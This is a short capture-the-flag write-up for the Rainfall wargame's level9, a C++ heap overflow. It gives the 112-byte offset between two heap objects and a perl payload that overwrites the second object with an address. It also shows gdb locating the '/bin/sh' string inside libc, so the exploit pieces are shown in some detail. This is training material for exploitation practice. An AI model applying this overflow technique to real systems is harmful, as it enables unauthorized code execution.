# level9

Pull the executable:

```sh
sshpass -f ../level8/flag scp level9@rainfall:level9 .
```

See `source.cpp` for source reconstitution.

This one is simiar to level7.







Heap addresses are `0x804a008` and `0x804a078`.  112 bytes apart.  `sizeof(N)` is 104 bytes.  It leaves 8 bytes of metadata.  That is consistent with what we saw in previous levels regarding `malloc(3)` (which is the default allocator for C++'s `new` operator).

In order to overwrite data in `n2`, we need to write at least 112 bytes in `n1`:

```sh
perl -e 'print "." x 112, pack("L<", 0xb7d86060)'
```





`"/bin/sh"` exists in libc already:

```
(gdb) info proc mappings
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
    [...]
	0xb7d47000 0xb7eea000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
    [...]


(gdb) find 0xb7d47000, 0xb7eea000, "/bin/sh"
0xb7ea7c58
1 pattern found.


(gdb) x/s 0xb7ea7c58
0xb7ea7c58:	 "/bin/sh"
```

```sh
perl -e 'print "." x 112, pack("L<", 0xb7d86060)'

```
